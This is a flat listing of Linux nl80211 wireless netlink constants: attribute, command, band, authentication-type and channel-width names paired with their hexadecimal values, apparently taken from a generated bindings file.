NL80211_ATTR_ACL_POLICY                                 = 0xa5
NL80211_ATTR_ADMITTED_TIME                              = 0xd4
NL80211_ATTR_AIRTIME_WEIGHT                             = 0x112
NL80211_ATTR_AKM_SUITES                                 = 0x4c
NL80211_ATTR_AP_ISOLATE                                 = 0x60
NL80211_ATTR_AUTH_DATA                                  = 0x9c
NL80211_ATTR_AUTH_TYPE                                  = 0x35
NL80211_ATTR_BANDS                                      = 0xef
NL80211_ATTR_BEACON_HEAD                                = 0xe
NL80211_ATTR_BEACON_INTERVAL                            = 0xc
NL80211_ATTR_BEACON_TAIL                                = 0xf
NL80211_ATTR_BG_SCAN_PERIOD                             = 0x98
NL80211_ATTR_BSS                                        = 0x2f
NL80211_ATTR_BSSID                                      = 0xf5
NL80211_ATTR_BSS_BASIC_RATES                            = 0x24
NL80211_ATTR_BSS_CTS_PROT                               = 0x1c
NL80211_ATTR_BSS_HT_OPMODE                              = 0x6d
NL80211_ATTR_BSS_SELECT                                 = 0xe3
NL80211_ATTR_BSS_SHORT_PREAMBLE                         = 0x1d
NL80211_ATTR_BSS_SHORT_SLOT_TIME                        = 0x1e
NL80211_ATTR_CENTER_FREQ1                               = 0xa0
NL80211_ATTR_CENTER_FREQ1_OFFSET                        = 0x123
NL80211_ATTR_CENTER_FREQ2                               = 0xa1
NL80211_ATTR_CHANNEL_WIDTH                              = 0x9f
NL80211_ATTR_CH_SWITCH_BLOCK_TX                         = 0xb8
NL80211_ATTR_CH_SWITCH_COUNT                            = 0xb7
NL80211_ATTR_CIPHER_SUITES                              = 0x39
NL80211_ATTR_CIPHER_SUITES_PAIRWISE                     = 0x49
NL80211_ATTR_CIPHER_SUITE_GROUP                         = 0x4a
NL80211_ATTR_CNTDWN_OFFS_BEACON                         = 0xba
NL80211_ATTR_CNTDWN_OFFS_PRESP                          = 0xbb
NL80211_ATTR_COALESCE_RULE                              = 0xb6
NL80211_ATTR_COALESCE_RULE_CONDITION                    = 0x2
NL80211_ATTR_COALESCE_RULE_DELAY                        = 0x1
NL80211_ATTR_COALESCE_RULE_MAX                          = 0x3
NL80211_ATTR_COALESCE_RULE_PKT_PATTERN                  = 0x3
NL80211_ATTR_CONN_FAILED_REASON                         = 0x9b
NL80211_ATTR_CONTROL_PORT                               = 0x44
NL80211_ATTR_CONTROL_PORT_ETHERTYPE                     = 0x66
NL80211_ATTR_CONTROL_PORT_NO_ENCRYPT                    = 0x67
NL80211_ATTR_CONTROL_PORT_NO_PREAUTH                    = 0x11e
NL80211_ATTR_CONTROL_PORT_OVER_NL80211                  = 0x108
NL80211_ATTR_COOKIE                                     = 0x58
NL80211_ATTR_CQM                                        = 0x5e
NL80211_ATTR_CQM_BEACON_LOSS_EVENT                      = 0x8
NL80211_ATTR_CQM_MAX                                    = 0x9
NL80211_ATTR_CQM_PKT_LOSS_EVENT                         = 0x4
NL80211_ATTR_CQM_RSSI_HYST                              = 0x2
NL80211_ATTR_CQM_RSSI_LEVEL                             = 0x9
NL80211_ATTR_CQM_RSSI_THOLD                             = 0x1
NL80211_ATTR_CQM_RSSI_THRESHOLD_EVENT                   = 0x3
NL80211_ATTR_CQM_TXE_INTVL                              = 0x7
NL80211_ATTR_CQM_TXE_PKTS                               = 0x6
NL80211_ATTR_CQM_TXE_RATE                               = 0x5
NL80211_ATTR_CRIT_PROT_ID                               = 0xb3
NL80211_ATTR_CSA_C_OFFSETS_TX                           = 0xcd
NL80211_ATTR_CSA_C_OFF_BEACON                           = 0xba
NL80211_ATTR_CSA_C_OFF_PRESP                            = 0xbb
NL80211_ATTR_CSA_IES                                    = 0xb9
NL80211_ATTR_DEVICE_AP_SME                              = 0x8d
NL80211_ATTR_DFS_CAC_TIME                               = 0x7
NL80211_ATTR_DFS_REGION                                 = 0x92
NL80211_ATTR_DISABLE_HE                                 = 0x12d
NL80211_ATTR_DISABLE_HT                                 = 0x93
NL80211_ATTR_DISABLE_VHT                                = 0xaf
NL80211_ATTR_DISCONNECTED_BY_AP                         = 0x47
NL80211_ATTR_DONT_WAIT_FOR_ACK                          = 0x8e
NL80211_ATTR_DTIM_PERIOD                                = 0xd
NL80211_ATTR_DURATION                                   = 0x57
NL80211_ATTR_EXTERNAL_AUTH_ACTION                       = 0x104
NL80211_ATTR_EXTERNAL_AUTH_SUPPORT                      = 0x105
NL80211_ATTR_EXT_CAPA                                   = 0xa9
NL80211_ATTR_EXT_CAPA_MASK                              = 0xaa
NL80211_ATTR_EXT_FEATURES                               = 0xd9
NL80211_ATTR_FEATURE_FLAGS                              = 0x8f
NL80211_ATTR_FILS_CACHE_ID                              = 0xfd
NL80211_ATTR_FILS_DISCOVERY                             = 0x126
NL80211_ATTR_FILS_ERP_NEXT_SEQ_NUM                      = 0xfb
NL80211_ATTR_FILS_ERP_REALM                             = 0xfa
NL80211_ATTR_FILS_ERP_RRK                               = 0xfc
NL80211_ATTR_FILS_ERP_USERNAME                          = 0xf9
NL80211_ATTR_FILS_KEK                                   = 0xf2
NL80211_ATTR_FILS_NONCES                                = 0xf3
NL80211_ATTR_FRAME                                      = 0x33
NL80211_ATTR_FRAME_MATCH                                = 0x5b
NL80211_ATTR_FRAME_TYPE                                 = 0x65
NL80211_ATTR_FREQ_AFTER                                 = 0x3b
NL80211_ATTR_FREQ_BEFORE                                = 0x3a
NL80211_ATTR_FREQ_FIXED                                 = 0x3c
NL80211_ATTR_FREQ_RANGE_END                             = 0x3
NL80211_ATTR_FREQ_RANGE_MAX_BW                          = 0x4
NL80211_ATTR_FREQ_RANGE_START                           = 0x2
NL80211_ATTR_FTM_RESPONDER                              = 0x10e
NL80211_ATTR_FTM_RESPONDER_STATS                        = 0x10f
NL80211_ATTR_GENERATION                                 = 0x2e
NL80211_ATTR_HANDLE_DFS                                 = 0xbf
NL80211_ATTR_HE_6GHZ_CAPABILITY                         = 0x125
NL80211_ATTR_HE_BSS_COLOR                               = 0x11b
NL80211_ATTR_HE_CAPABILITY                              = 0x10d
NL80211_ATTR_HE_OBSS_PD                                 = 0x117
NL80211_ATTR_HIDDEN_SSID                                = 0x7e
NL80211_ATTR_HT_CAPABILITY                              = 0x1f
NL80211_ATTR_HT_CAPABILITY_MASK                         = 0x94
NL80211_ATTR_IE                                         = 0x2a
NL80211_ATTR_IE_ASSOC_RESP                              = 0x80
NL80211_ATTR_IE_PROBE_RESP                              = 0x7f
NL80211_ATTR_IE_RIC                                     = 0xb2
NL80211_ATTR_IFACE_SOCKET_OWNER                         = 0xcc
NL80211_ATTR_IFINDEX                                    = 0x3
NL80211_ATTR_IFNAME                                     = 0x4
NL80211_ATTR_IFTYPE                                     = 0x5
NL80211_ATTR_IFTYPE_AKM_SUITES                          = 0x11c
NL80211_ATTR_IFTYPE_EXT_CAPA                            = 0xe6
NL80211_ATTR_INACTIVITY_TIMEOUT                         = 0x96
NL80211_ATTR_INTERFACE_COMBINATIONS                     = 0x78
NL80211_ATTR_KEY                                        = 0x50
NL80211_ATTR_KEYS                                       = 0x51
NL80211_ATTR_KEY_CIPHER                                 = 0x9
NL80211_ATTR_KEY_DATA                                   = 0x7
NL80211_ATTR_KEY_DEFAULT                                = 0xb
NL80211_ATTR_KEY_DEFAULT_MGMT                           = 0x28
NL80211_ATTR_KEY_DEFAULT_TYPES                          = 0x6e
NL80211_ATTR_KEY_IDX                                    = 0x8
NL80211_ATTR_KEY_SEQ                                    = 0xa
NL80211_ATTR_KEY_TYPE                                   = 0x37
NL80211_ATTR_LOCAL_MESH_POWER_MODE                      = 0xa4
NL80211_ATTR_LOCAL_STATE_CHANGE                         = 0x5f
NL80211_ATTR_MAC                                        = 0x6
NL80211_ATTR_MAC_ACL_MAX                                = 0xa7
NL80211_ATTR_MAC_ADDRS                                  = 0xa6
NL80211_ATTR_MAC_HINT                                   = 0xc8
NL80211_ATTR_MAC_MASK                                   = 0xd7
NL80211_ATTR_MAX                                        = 0x137
NL80211_ATTR_MAX_AP_ASSOC_STA                           = 0xca
NL80211_ATTR_MAX_CRIT_PROT_DURATION                     = 0xb4
NL80211_ATTR_MAX_CSA_COUNTERS                           = 0xce
NL80211_ATTR_MAX_MATCH_SETS                             = 0x85
NL80211_ATTR_MAX_NUM_PMKIDS                             = 0x56
NL80211_ATTR_MAX_NUM_SCAN_SSIDS                         = 0x2b
NL80211_ATTR_MAX_NUM_SCHED_SCAN_PLANS                   = 0xde
NL80211_ATTR_MAX_NUM_SCHED_SCAN_SSIDS                   = 0x7b
NL80211_ATTR_MAX_REMAIN_ON_CHANNEL_DURATION             = 0x6f
NL80211_ATTR_MAX_SCAN_IE_LEN                            = 0x38
NL80211_ATTR_MAX_SCAN_PLAN_INTERVAL                     = 0xdf
NL80211_ATTR_MAX_SCAN_PLAN_ITERATIONS                   = 0xe0
NL80211_ATTR_MAX_SCHED_SCAN_IE_LEN                      = 0x7c
NL80211_ATTR_MCAST_RATE                                 = 0x6b
NL80211_ATTR_MDID                                       = 0xb1
NL80211_ATTR_MEASUREMENT_DURATION                       = 0xeb
NL80211_ATTR_MEASUREMENT_DURATION_MANDATORY             = 0xec
NL80211_ATTR_MESH_CONFIG                                = 0x23
NL80211_ATTR_MESH_ID                                    = 0x18
NL80211_ATTR_MESH_PEER_AID                              = 0xed
NL80211_ATTR_MESH_SETUP                                 = 0x70
NL80211_ATTR_MGMT_SUBTYPE                               = 0x29
NL80211_ATTR_MNTR_FLAGS                                 = 0x17
NL80211_ATTR_MPATH_INFO                                 = 0x1b
NL80211_ATTR_MPATH_NEXT_HOP                             = 0x1a
NL80211_ATTR_MULTICAST_TO_UNICAST_ENABLED               = 0xf4
NL80211_ATTR_MU_MIMO_FOLLOW_MAC_ADDR                    = 0xe8
NL80211_ATTR_MU_MIMO_GROUP_DATA                         = 0xe7
NL80211_ATTR_NAN_FUNC                                   = 0xf0
NL80211_ATTR_NAN_MASTER_PREF                            = 0xee
NL80211_ATTR_NAN_MATCH                                  = 0xf1
NL80211_ATTR_NETNS_FD                                   = 0xdb
NL80211_ATTR_NOACK_MAP                                  = 0x95
NL80211_ATTR_NSS                                        = 0x106
NL80211_ATTR_OFFCHANNEL_TX_OK                           = 0x6c
NL80211_ATTR_OPER_CLASS                                 = 0xd6
NL80211_ATTR_OPMODE_NOTIF                               = 0xc2
NL80211_ATTR_P2P_CTWINDOW                               = 0xa2
NL80211_ATTR_P2P_OPPPS                                  = 0xa3
NL80211_ATTR_PAD                                        = 0xe5
NL80211_ATTR_PBSS                                       = 0xe2
NL80211_ATTR_PEER_AID                                   = 0xb5
NL80211_ATTR_PEER_MEASUREMENTS                          = 0x111
NL80211_ATTR_PID                                        = 0x52
NL80211_ATTR_PMK                                        = 0xfe
NL80211_ATTR_PMKID                                      = 0x55
NL80211_ATTR_PMKR0_NAME                                 = 0x102
NL80211_ATTR_PMKSA_CANDIDATE                            = 0x86
NL80211_ATTR_PMK_LIFETIME                               = 0x11f
NL80211_ATTR_PMK_REAUTH_THRESHOLD                       = 0x120
NL80211_ATTR_PORT_AUTHORIZED                            = 0x103
NL80211_ATTR_POWER_RULE_MAX_ANT_GAIN                    = 0x5
NL80211_ATTR_POWER_RULE_MAX_EIRP                        = 0x6
NL80211_ATTR_PREV_BSSID                                 = 0x4f
NL80211_ATTR_PRIVACY                                    = 0x46
NL80211_ATTR_PROBE_RESP                                 = 0x91
NL80211_ATTR_PROBE_RESP_OFFLOAD                         = 0x90
NL80211_ATTR_PROTOCOL_FEATURES                          = 0xad
NL80211_ATTR_PS_STATE                                   = 0x5d
NL80211_ATTR_QOS_MAP                                    = 0xc7
NL80211_ATTR_RADAR_EVENT                                = 0xa8
NL80211_ATTR_REASON_CODE                                = 0x36
NL80211_ATTR_RECEIVE_MULTICAST                          = 0x121
NL80211_ATTR_RECONNECT_REQUESTED                        = 0x12b
NL80211_ATTR_REG_ALPHA2                                 = 0x21
NL80211_ATTR_REG_INDOOR                                 = 0xdd
NL80211_ATTR_REG_INITIATOR                              = 0x30
NL80211_ATTR_REG_RULES                                  = 0x22
NL80211_ATTR_REG_RULE_FLAGS                             = 0x1
NL80211_ATTR_REG_TYPE                                   = 0x31
NL80211_ATTR_REKEY_DATA                                 = 0x7a
NL80211_ATTR_REQ_IE                                     = 0x4d
NL80211_ATTR_RESP_IE                                    = 0x4e
NL80211_ATTR_ROAM_SUPPORT                               = 0x83
NL80211_ATTR_RXMGMT_FLAGS                               = 0xbc
NL80211_ATTR_RX_FRAME_TYPES                             = 0x64
NL80211_ATTR_RX_SIGNAL_DBM                              = 0x97
NL80211_ATTR_S1G_CAPABILITY                             = 0x128
NL80211_ATTR_S1G_CAPABILITY_MASK                        = 0x129
NL80211_ATTR_SAE_DATA                                   = 0x9c
NL80211_ATTR_SAE_PASSWORD                               = 0x115
NL80211_ATTR_SAE_PWE                                    = 0x12a
NL80211_ATTR_SAR_SPEC                                   = 0x12c
NL80211_ATTR_SCAN_FLAGS                                 = 0x9e
NL80211_ATTR_SCAN_FREQUENCIES                           = 0x2c
NL80211_ATTR_SCAN_FREQ_KHZ                              = 0x124
NL80211_ATTR_SCAN_GENERATION                            = 0x2e
NL80211_ATTR_SCAN_SSIDS                                 = 0x2d
NL80211_ATTR_SCAN_START_TIME_TSF                        = 0xe9
NL80211_ATTR_SCAN_START_TIME_TSF_BSSID                  = 0xea
NL80211_ATTR_SCAN_SUPP_RATES                            = 0x7d
NL80211_ATTR_SCHED_SCAN_DELAY                           = 0xdc
NL80211_ATTR_SCHED_SCAN_INTERVAL                        = 0x77
NL80211_ATTR_SCHED_SCAN_MATCH                           = 0x84
NL80211_ATTR_SCHED_SCAN_MATCH_SSID                      = 0x1
NL80211_ATTR_SCHED_SCAN_MAX_REQS                        = 0x100
NL80211_ATTR_SCHED_SCAN_MULTI                           = 0xff
NL80211_ATTR_SCHED_SCAN_PLANS                           = 0xe1
NL80211_ATTR_SCHED_SCAN_RELATIVE_RSSI                   = 0xf6
NL80211_ATTR_SCHED_SCAN_RSSI_ADJUST                     = 0xf7
NL80211_ATTR_SMPS_MODE                                  = 0xd5
NL80211_ATTR_SOCKET_OWNER                               = 0xcc
NL80211_ATTR_SOFTWARE_IFTYPES                           = 0x79
NL80211_ATTR_SPLIT_WIPHY_DUMP                           = 0xae
NL80211_ATTR_SSID                                       = 0x34
NL80211_ATTR_STATUS_CODE                                = 0x48
NL80211_ATTR_STA_AID                                    = 0x10
NL80211_ATTR_STA_CAPABILITY                             = 0xab
NL80211_ATTR_STA_EXT_CAPABILITY                         = 0xac
NL80211_ATTR_STA_FLAGS                                  = 0x11
NL80211_ATTR_STA_FLAGS2                                 = 0x43
NL80211_ATTR_STA_INFO                                   = 0x15
NL80211_ATTR_STA_LISTEN_INTERVAL                        = 0x12
NL80211_ATTR_STA_PLINK_ACTION                           = 0x19
NL80211_ATTR_STA_PLINK_STATE                            = 0x74
NL80211_ATTR_STA_SUPPORTED_CHANNELS                     = 0xbd
NL80211_ATTR_STA_SUPPORTED_OPER_CLASSES                 = 0xbe
NL80211_ATTR_STA_SUPPORTED_RATES                        = 0x13
NL80211_ATTR_STA_SUPPORT_P2P_PS                         = 0xe4
NL80211_ATTR_STA_TX_POWER                               = 0x114
NL80211_ATTR_STA_TX_POWER_SETTING                       = 0x113
NL80211_ATTR_STA_VLAN                                   = 0x14
NL80211_ATTR_STA_WME                                    = 0x81
NL80211_ATTR_SUPPORTED_COMMANDS                         = 0x32
NL80211_ATTR_SUPPORTED_IFTYPES                          = 0x20
NL80211_ATTR_SUPPORT_10_MHZ                             = 0xc1
NL80211_ATTR_SUPPORT_5_MHZ                              = 0xc0
NL80211_ATTR_SUPPORT_AP_UAPSD                           = 0x82
NL80211_ATTR_SUPPORT_IBSS_RSN                           = 0x68
NL80211_ATTR_SUPPORT_MESH_AUTH                          = 0x73
NL80211_ATTR_SURVEY_INFO                                = 0x54
NL80211_ATTR_SURVEY_RADIO_STATS                         = 0xda
NL80211_ATTR_TDLS_ACTION                                = 0x88
NL80211_ATTR_TDLS_DIALOG_TOKEN                          = 0x89
NL80211_ATTR_TDLS_EXTERNAL_SETUP                        = 0x8c
NL80211_ATTR_TDLS_INITIATOR                             = 0xcf
NL80211_ATTR_TDLS_OPERATION                             = 0x8a
NL80211_ATTR_TDLS_PEER_CAPABILITY                       = 0xcb
NL80211_ATTR_TDLS_SUPPORT                               = 0x8b
NL80211_ATTR_TESTDATA                                   = 0x45
NL80211_ATTR_TID_CONFIG                                 = 0x11d
NL80211_ATTR_TIMED_OUT                                  = 0x41
NL80211_ATTR_TIMEOUT                                    = 0x110
NL80211_ATTR_TIMEOUT_REASON                             = 0xf8
NL80211_ATTR_TSID                                       = 0xd2
NL80211_ATTR_TWT_RESPONDER                              = 0x116
NL80211_ATTR_TXQ_LIMIT                                  = 0x10a
NL80211_ATTR_TXQ_MEMORY_LIMIT                           = 0x10b
NL80211_ATTR_TXQ_QUANTUM                                = 0x10c
NL80211_ATTR_TXQ_STATS                                  = 0x109
NL80211_ATTR_TX_FRAME_TYPES                             = 0x63
NL80211_ATTR_TX_NO_CCK_RATE                             = 0x87
NL80211_ATTR_TX_RATES                                   = 0x5a
NL80211_ATTR_UNSOL_BCAST_PROBE_RESP                     = 0x127
NL80211_ATTR_UNSPEC                                     = 0x0
NL80211_ATTR_USER_PRIO                                  = 0xd3
NL80211_ATTR_USER_REG_HINT_TYPE                         = 0x9a
NL80211_ATTR_USE_MFP                                    = 0x42
NL80211_ATTR_USE_RRM                                    = 0xd0
NL80211_ATTR_VENDOR_DATA                                = 0xc5
NL80211_ATTR_VENDOR_EVENTS                              = 0xc6
NL80211_ATTR_VENDOR_ID                                  = 0xc3
NL80211_ATTR_VENDOR_SUBCMD                              = 0xc4
NL80211_ATTR_VHT_CAPABILITY                             = 0x9d
NL80211_ATTR_VHT_CAPABILITY_MASK                        = 0xb0
NL80211_ATTR_VLAN_ID                                    = 0x11a
NL80211_ATTR_WANT_1X_4WAY_HS                            = 0x101
NL80211_ATTR_WDEV                                       = 0x99
NL80211_ATTR_WIPHY                                      = 0x1
NL80211_ATTR_WIPHY_ANTENNA_AVAIL_RX                     = 0x72
NL80211_ATTR_WIPHY_ANTENNA_AVAIL_TX                     = 0x71
NL80211_ATTR_WIPHY_ANTENNA_RX                           = 0x6a
NL80211_ATTR_WIPHY_ANTENNA_TX                           = 0x69
NL80211_ATTR_WIPHY_BANDS                                = 0x16
NL80211_ATTR_WIPHY_CHANNEL_TYPE                         = 0x27
NL80211_ATTR_WIPHY_COVERAGE_CLASS                       = 0x59
NL80211_ATTR_WIPHY_DYN_ACK                              = 0xd1
NL80211_ATTR_WIPHY_EDMG_BW_CONFIG                       = 0x119
NL80211_ATTR_WIPHY_EDMG_CHANNELS                        = 0x118
NL80211_ATTR_WIPHY_FRAG_THRESHOLD                       = 0x3f
NL80211_ATTR_WIPHY_FREQ                                 = 0x26
NL80211_ATTR_WIPHY_FREQ_HINT                            = 0xc9
NL80211_ATTR_WIPHY_FREQ_OFFSET                          = 0x122
NL80211_ATTR_WIPHY_NAME                                 = 0x2
NL80211_ATTR_WIPHY_RETRY_LONG                           = 0x3e
NL80211_ATTR_WIPHY_RETRY_SHORT                          = 0x3d
NL80211_ATTR_WIPHY_RTS_THRESHOLD                        = 0x40
NL80211_ATTR_WIPHY_SELF_MANAGED_REG                     = 0xd8
NL80211_ATTR_WIPHY_TXQ_PARAMS                           = 0x25
NL80211_ATTR_WIPHY_TX_POWER_LEVEL                       = 0x62
NL80211_ATTR_WIPHY_TX_POWER_SETTING                     = 0x61
NL80211_ATTR_WOWLAN_TRIGGERS                            = 0x75
NL80211_ATTR_WOWLAN_TRIGGERS_SUPPORTED                  = 0x76
NL80211_ATTR_WPA_VERSIONS                               = 0x4b
NL80211_AUTHTYPE_AUTOMATIC                              = 0x8
NL80211_AUTHTYPE_FILS_PK                                = 0x7
NL80211_AUTHTYPE_FILS_SK                                = 0x5
NL80211_AUTHTYPE_FILS_SK_PFS                            = 0x6
NL80211_AUTHTYPE_FT                                     = 0x2
NL80211_AUTHTYPE_MAX                                    = 0x7
NL80211_AUTHTYPE_NETWORK_EAP                            = 0x3
NL80211_AUTHTYPE_OPEN_SYSTEM                            = 0x0
NL80211_AUTHTYPE_SAE                                    = 0x4
NL80211_AUTHTYPE_SHARED_KEY                             = 0x1
NL80211_BAND_2GHZ                                       = 0x0
NL80211_BAND_5GHZ                                       = 0x1
NL80211_BAND_60GHZ                                      = 0x2
NL80211_BAND_6GHZ                                       = 0x3
NL80211_BAND_ATTR_EDMG_BW_CONFIG                        = 0xb
NL80211_BAND_ATTR_EDMG_CHANNELS                         = 0xa
NL80211_BAND_ATTR_FREQS                                 = 0x1
NL80211_BAND_ATTR_HT_AMPDU_DENSITY                      = 0x6
NL80211_BAND_ATTR_HT_AMPDU_FACTOR                       = 0x5
NL80211_BAND_ATTR_HT_CAPA                               = 0x4
NL80211_BAND_ATTR_HT_MCS_SET                            = 0x3
NL80211_BAND_ATTR_IFTYPE_DATA                           = 0x9
NL80211_BAND_ATTR_MAX                                   = 0xb
NL80211_BAND_ATTR_RATES                                 = 0x2
NL80211_BAND_ATTR_VHT_CAPA                              = 0x8
NL80211_BAND_ATTR_VHT_MCS_SET                           = 0x7
NL80211_BAND_IFTYPE_ATTR_HE_6GHZ_CAPA                   = 0x6
NL80211_BAND_IFTYPE_ATTR_HE_CAP_MAC                     = 0x2
NL80211_BAND_IFTYPE_ATTR_HE_CAP_MCS_SET                 = 0x4
NL80211_BAND_IFTYPE_ATTR_HE_CAP_PHY                     = 0x3
NL80211_BAND_IFTYPE_ATTR_HE_CAP_PPE                     = 0x5
NL80211_BAND_IFTYPE_ATTR_IFTYPES                        = 0x1
NL80211_BAND_IFTYPE_ATTR_MAX                            = 0xb
NL80211_BAND_S1GHZ                                      = 0x4
NL80211_BITRATE_ATTR_2GHZ_SHORTPREAMBLE                 = 0x2
NL80211_BITRATE_ATTR_MAX                                = 0x2
NL80211_BITRATE_ATTR_RATE                               = 0x1
NL80211_BSS_BEACON_IES                                  = 0xb
NL80211_BSS_BEACON_INTERVAL                             = 0x4
NL80211_BSS_BEACON_TSF                                  = 0xd
NL80211_BSS_BSSID                                       = 0x1
NL80211_BSS_CAPABILITY                                  = 0x5
NL80211_BSS_CHAIN_SIGNAL                                = 0x13
NL80211_BSS_CHAN_WIDTH                                  = 0xc
NL80211_BSS_CHAN_WIDTH_1                                = 0x3
NL80211_BSS_CHAN_WIDTH_10                               = 0x1
NL80211_BSS_CHAN_WIDTH_2                                = 0x4
NL80211_BSS_CHAN_WIDTH_20                               = 0x0
NL80211_BSS_CHAN_WIDTH_5                                = 0x2
NL80211_BSS_FREQUENCY                                   = 0x2
NL80211_BSS_FREQUENCY_OFFSET                            = 0x14
NL80211_BSS_INFORMATION_ELEMENTS                        = 0x6
NL80211_BSS_LAST_SEEN_BOOTTIME                          = 0xf
NL80211_BSS_MAX                                         = 0x14
NL80211_BSS_PAD                                         = 0x10
NL80211_BSS_PARENT_BSSID                                = 0x12
NL80211_BSS_PARENT_TSF                                  = 0x11
NL80211_BSS_PRESP_DATA                                  = 0xe
NL80211_BSS_SEEN_MS_AGO                                 = 0xa
NL80211_BSS_SELECT_ATTR_BAND_PREF                       = 0x2
NL80211_BSS_SELECT_ATTR_MAX                             = 0x3
NL80211_BSS_SELECT_ATTR_RSSI                            = 0x1
NL80211_BSS_SELECT_ATTR_RSSI_ADJUST                     = 0x3
NL80211_BSS_SIGNAL_MBM                                  = 0x7
NL80211_BSS_SIGNAL_UNSPEC                               = 0x8
NL80211_BSS_STATUS                                      = 0x9
NL80211_BSS_STATUS_ASSOCIATED                           = 0x1
NL80211_BSS_STATUS_AUTHENTICATED                        = 0x0
NL80211_BSS_STATUS_IBSS_JOINED                          = 0x2
NL80211_BSS_TSF                                         = 0x3
NL80211_CHAN_HT20                                       = 0x1
NL80211_CHAN_HT40MINUS                                  = 0x2
NL80211_CHAN_HT40PLUS                                   = 0x3
NL80211_CHAN_NO_HT                                      = 0x0
NL80211_CHAN_WIDTH_1                                    = 0x8
NL80211_CHAN_WIDTH_10                                   = 0x7
NL80211_CHAN_WIDTH_16                                   = 0xc
NL80211_CHAN_WIDTH_160                                  = 0x5
NL80211_CHAN_WIDTH_2                                    = 0x9
NL80211_CHAN_WIDTH_20                                   = 0x1
NL80211_CHAN_WIDTH_20_NOHT                              = 0x0
NL80211_CHAN_WIDTH_4                                    = 0xa
NL80211_CHAN_WIDTH_40                                   = 0x2
NL80211_CHAN_WIDTH_5                                    = 0x6
NL80211_CHAN_WIDTH_8                                    = 0xb
NL80211_CHAN_WIDTH_80                                   = 0x3
NL80211_CHAN_WIDTH_80P80                                = 0x4
NL80211_CMD_ABORT_SCAN                                  = 0x72
NL80211_CMD_ACTION                                      = 0x3b
NL80211_CMD_ACTION_TX_STATUS                            = 0x3c
NL80211_CMD_ADD_NAN_FUNCTION                            = 0x75
NL80211_CMD_ADD_TX_TS                                   = 0x69
NL80211_CMD_ASSOCIATE                                   = 0x26
NL80211_CMD_AUTHENTICATE                                = 0x25
NL80211_CMD_CANCEL_REMAIN_ON_CHANNEL                    = 0x38
NL80211_CMD_CHANGE_NAN_CONFIG                           = 0x77
NL80211_CMD_CHANNEL_SWITCH                              = 0x66
NL80211_CMD_CH_SWITCH_NOTIFY                            = 0x58
NL80211_CMD_CH_SWITCH_STARTED_NOTIFY                    = 0x6e
NL80211_CMD_CONNECT                                     = 0x2e
NL80211_CMD_CONN_FAILED                                 = 0x5b
NL80211_CMD_CONTROL_PORT_FRAME                          = 0x81
NL80211_CMD_CONTROL_PORT_FRAME_TX_STATUS                = 0x8b
NL80211_CMD_CRIT_PROTOCOL_START                         = 0x62
NL80211_CMD_CRIT_PROTOCOL_STOP                          = 0x63
NL80211_CMD_DEAUTHENTICATE                              = 0x27
NL80211_CMD_DEL_BEACON                                  = 0x10
NL80211_CMD_DEL_INTERFACE                               = 0x8
NL80211_CMD_DEL_KEY                                     = 0xc
NL80211_CMD_DEL_MPATH                                   = 0x18
NL80211_CMD_DEL_NAN_FUNCTION                            = 0x76
NL80211_CMD_DEL_PMK                                     = 0x7c
NL80211_CMD_DEL_PMKSA                                   = 0x35
NL80211_CMD_DEL_STATION                                 = 0x14
NL80211_CMD_DEL_TX_TS                                   = 0x6a
NL80211_CMD_DEL_WIPHY                                   = 0x4
NL80211_CMD_DISASSOCIATE                                = 0x28
NL80211_CMD_DISCONNECT                                  = 0x30
NL80211_CMD_EXTERNAL_AUTH                               = 0x7f
NL80211_CMD_FLUSH_PMKSA                                 = 0x36
NL80211_CMD_FRAME                                       = 0x3b
NL80211_CMD_FRAME_TX_STATUS                             = 0x3c
NL80211_CMD_FRAME_WAIT_CANCEL                           = 0x43
NL80211_CMD_FT_EVENT                                    = 0x61
NL80211_CMD_GET_BEACON                                  = 0xd
NL80211_CMD_GET_COALESCE                                = 0x64
NL80211_CMD_GET_FTM_RESPONDER_STATS                     = 0x82
NL80211_CMD_GET_INTERFACE                               = 0x5
NL80211_CMD_GET_KEY                                     = 0x9
NL80211_CMD_GET_MESH_CONFIG                             = 0x1c
NL80211_CMD_GET_MESH_PARAMS                             = 0x1c
NL80211_CMD_GET_MPATH                                   = 0x15
NL80211_CMD_GET_MPP                                     = 0x6b
NL80211_CMD_GET_POWER_SAVE                              = 0x3e
NL80211_CMD_GET_PROTOCOL_FEATURES                       = 0x5f
NL80211_CMD_GET_REG                                     = 0x1f
NL80211_CMD_GET_SCAN                                    = 0x20
NL80211_CMD_GET_STATION                                 = 0x11
NL80211_CMD_GET_SURVEY                                  = 0x32
NL80211_CMD_GET_WIPHY                                   = 0x1
NL80211_CMD_GET_WOWLAN                                  = 0x49
NL80211_CMD_JOIN_IBSS                                   = 0x2b
NL80211_CMD_JOIN_MESH                                   = 0x44
NL80211_CMD_JOIN_OCB                                    = 0x6c
NL80211_CMD_LEAVE_IBSS                                  = 0x2c
NL80211_CMD_LEAVE_MESH                                  = 0x45
NL80211_CMD_LEAVE_OCB                                   = 0x6d
NL80211_CMD_MAX                                         = 0x93
NL80211_CMD_MICHAEL_MIC_FAILURE                         = 0x29
NL80211_CMD_NAN_MATCH                                   = 0x78
NL80211_CMD_NEW_BEACON                                  = 0xf
NL80211_CMD_NEW_INTERFACE                               = 0x7
NL80211_CMD_NEW_KEY                                     = 0xb
NL80211_CMD_NEW_MPATH                                   = 0x17
NL80211_CMD_NEW_PEER_CANDIDATE                          = 0x48
NL80211_CMD_NEW_SCAN_RESULTS                            = 0x22
NL80211_CMD_NEW_STATION                                 = 0x13
NL80211_CMD_NEW_SURVEY_RESULTS                          = 0x33
NL80211_CMD_NEW_WIPHY                                   = 0x3
NL80211_CMD_NOTIFY_CQM                                  = 0x40
NL80211_CMD_NOTIFY_RADAR                                = 0x86
NL80211_CMD_PEER_MEASUREMENT_COMPLETE                   = 0x85
NL80211_CMD_PEER_MEASUREMENT_RESULT                     = 0x84
NL80211_CMD_PEER_MEASUREMENT_START                      = 0x83
NL80211_CMD_PMKSA_CANDIDATE                             = 0x50
NL80211_CMD_PORT_AUTHORIZED                             = 0x7d
NL80211_CMD_PROBE_CLIENT                                = 0x54
NL80211_CMD_PROBE_MESH_LINK                             = 0x88
NL80211_CMD_RADAR_DETECT                                = 0x5e
NL80211_CMD_REGISTER_ACTION                             = 0x3a
NL80211_CMD_REGISTER_BEACONS                            = 0x55
NL80211_CMD_REGISTER_FRAME                              = 0x3a
NL80211_CMD_REG_BEACON_HINT                             = 0x2a
NL80211_CMD_REG_CHANGE                                  = 0x24
NL80211_CMD_RELOAD_REGDB                                = 0x7e
NL80211_CMD_REMAIN_ON_CHANNEL                           = 0x37
NL80211_CMD_REQ_SET_REG                                 = 0x1b
